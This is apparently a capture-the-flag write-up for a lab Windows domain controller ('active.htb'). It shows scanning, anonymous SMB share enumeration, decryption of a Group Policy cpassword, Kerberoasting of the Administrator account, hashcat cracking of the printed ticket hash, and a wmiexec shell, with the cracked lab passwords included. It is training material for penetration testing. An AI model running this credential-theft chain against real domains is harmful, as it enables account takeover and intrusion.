## Port scan

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49162/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127
```

```
nmap -sC -sV -T5 -v -p- 10.129.58.15
```

Extra information

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-13 12:25:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-13T12:26:30
|_  start_date: 2026-09-13T11:45:19
```
## SMB anon login

```bash
nxc smb 10.129.58.15 -u 'guest' -p ''
```

![](pics/Pasted%20image%2020260913164349.png)

```bash
nxc smb 10.129.58.15 -u '' -p '' --rid-brute
```

![](pics/Pasted%20image%2020260913164615.png)

```bash
smbclient -L //active.htb/ -N
```

![](pics/Pasted%20image%2020260913163337.png)

There is a non default share called `Replication`, Lets see what is inside

```bash
smbclient //active.htb/Replication -N
```

![](pics/Pasted%20image%2020260913163536.png)

```
DfsrPrivate <- empty
Policies 
scripts <- empty
```
### Policies directory

```
{31B2F340-016D-11D2-945F-00C04FB984F9}
{6AC1786C-016F-11D2-945F-00C04fB984F9}
```

#### {31B2F340-016D-11D2-945F-00C04FB984F9} directory

```
GPT.INI
Group Policy -> GPE.INI
MACHINE
USER <- Empty
```
##### MACHINE directory

```
Microsoft -> GptTmpl.inf
Preferences -> Groups.xml
Registry.pol
```

![](pics/Pasted%20image%2020260913183216.png)

Groups.xml contents

![](pics/Pasted%20image%2020260913183158.png)

```
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS"
```

#### {6AC1786C-016F-11D2-945F-00C04fB984F9} directory

```
GPT.INI
MACHINE -> GptTmpl.inf
USER <- Empty
```

GptTmpl.inf contents

```
[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```
## LDAP

```bash
ldapsearch -x -H ldap://10.129.58.15 -D "guest@active.htb" -w "" -b "DC=active,DC=htb"
```

![](pics/Pasted%20image%2020260913164248.png)

## Using cpassword

![](pics/Pasted%20image%2020260913184849.png)

The first thing I did is using this cpassword to login directly which failed obviously

![](pics/Pasted%20image%2020260913185112.png)

Because these were encrypted but with a public well-known AES key. Lets retrieve the plaintext password!

![](pics/Pasted%20image%2020260913185613.png)

```
SVC_TGS
GPPstillStandingStrong2k18
```

There we go, the creds are valid

![](pics/Pasted%20image%2020260913185709.png)
## Trying to get a shell

Well...we could not login to get a shell but we have new creds to re-enumerate with.

![](pics/Pasted%20image%2020260913190855.png)

## Enumerate users

```bash
netexec smb 10.129.58.15 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute
```

![](pics/Pasted%20image%2020260913190412.png)
## Re-enumeration

Lets take a look inside bloodhound, I found no important links. So I re enumerated the shares with the new creds

![](pics/Pasted%20image%2020260913192555.png)

```bash
smbclient //active.htb/Users -U 'SVC_TGS@active.htb'
```

```
Administrator <- Denied
All Users <- symlink
Default <- Interesting
Default User <- Empty
desktop.ini
Public <- Denied
SVC_TGS <- user.txt
```

Interesting files inside `Default` directory

```
  NTUSER.DAT
  NTUSER.DAT.LOG
  NTUSER.DAT.LOG1
  NTUSER.DAT.LOG2
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
```

I used reglookup to search for interesting reg hives but this was a big rabbit hole.

```bash
reglookup NTUSER.DAT
```

![](pics/Pasted%20image%2020260913204942.png)

`SVC_TGS` directory

```
  Contacts
  Desktop -> user.txt
  Downloads <- Empty
  Favorites
  Links
  My Documents <- Empty
  My Music
  My Pictures <- Empty
  My Videos <- Empty
  Saved Games
  Searches
```

## Flag 1

![](pics/Pasted%20image%2020260913192629.png)

## PrivEsc to Administrator
### Bloodhound

```
rusthound-ce -d active.htb -i 10.129.58.15  -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -z 
```

![](pics/Pasted%20image%2020260913191148.png)

Administrator is `kerberoastable`, meaning we can dump krb5 ticket.

![](pics/Pasted%20image%2020260913203516.png)

### Dump the administrator ticket

The command to dump krb5 tickets for `kerberoastable` users.

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.58.15 active.htb/svc_tgs:GPPstillStandingStrong2k18
```

![](pics/Pasted%20image%2020260913204125.png)

### Crack the ticket to get the password

```bash
hashcat '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$fa5460a51ceed76a72997250e8c93028$abd70a17ae7a43e9da2ce1b91e293d637986be91d86a91be4b3017d5b8007de96984215bcae956dd852d0401c019d3046a86e1b24454b2238708e9f7592009746fed56da0c9cd967a9ba9bb03d938921e5319891b0d3a5b4bc01af9c741053bdf2fe8778a4b0d7efb9931cf658d1d47a187db66150ab5f25bc26ed7b086ba191b1494adcecb28cbb03ce5377f48f2a8f95f5e84d9dcad89ebd6a506da231d6401e88d56b9b7d6dc16a26b5e0233a7fdf7187dee5ff896804a9cab7c7c61d80878c21283796525782e70c282997223909b87b03bb846f279cb0e30bdb3ad1c16d86f76aeeeec1893a05dca1a2c1dec0c407c3f86191469f074a14377fb785b2e597ec8543a88590ed3fd91180ff561442f5be970077238a27bfc49ccd7e8245697333d36ddc00b464e1cb95f0ede809b55565443dab49d974bbfeb08ed3c0985e14e78a1528bf24db9fcadda62213f70491aaa3d0d02d0863d5933af9d7bc3bf3c6ca40ea94478079eff50ea2245a6c66bf395d80fe757bbde843d8f1d0c31277697b5f5fd77dfdc8c165ff24e93655d35132b9131b83a66101135f516bacf3d9ab644558fbd87d94b26827f677b9edb98a11fa2eabc978c972bb6dda9d8ecfef0a24fd31fb69c3d84962f75e26862245aee346201ce17332d27b3b803c6e0cbb2b6834997a675b06e2d5c7d06f896e29fb82eda4ca79227f0d05bd3e821111a9232d471fa785e61498254f811e975273ca7e9d4d327e595eee235b1e61b3c5066f659068958721f245db28eff5851c4de5d591728afc10efbd6e89c85caa2fc62c3250f9e39211ab1b952546cb4bb16b359c611e87def416405384b7a4de8f857a1d9cff851202a62ef977aed87a1546da1f65918835121bd9ea25391baab8d0d182a2ed38435137a21e30125c5105da883722ede4f884c3a99568afcb046551e7fad5d939233baaf4ea5211b9595d98e2adc4758cf57f1ff3077f115fe45e15eca7d2d6d9620596552b2dd2f145047450431a9ee4f1aaddb4ee3f4d7df0c0935e607718a502599a705a4338e2af5c66c62c497063182475c0b512a2396c47b1c05c1e7f73005358290f9c3c88905f03fa41763fcc8f55df4f8c4d280d14c08a80ffb4b79d20a95ede942ffc9db0c4b44c4ed01e97132ff4b9fcee46844d4e1b856dd0c5185a88261278c31113775d62e087ee5d7e142252ec0eff5276929fc11af3fcda0ca269349c21439127cae25b28d5621e9f51f322bdbd' /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260913204323.png)

Cracked creds

```
Administrator
Ticketmaster1968
```

Get a shell using `wmiexec`:

```bash
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.58.15
```

![](pics/Pasted%20image%2020260913204641.png)

## Flag 2

![](pics/Pasted%20image%2020260913204710.png)

![](pics/Pasted%20image%2020260913204730.png)

Done.
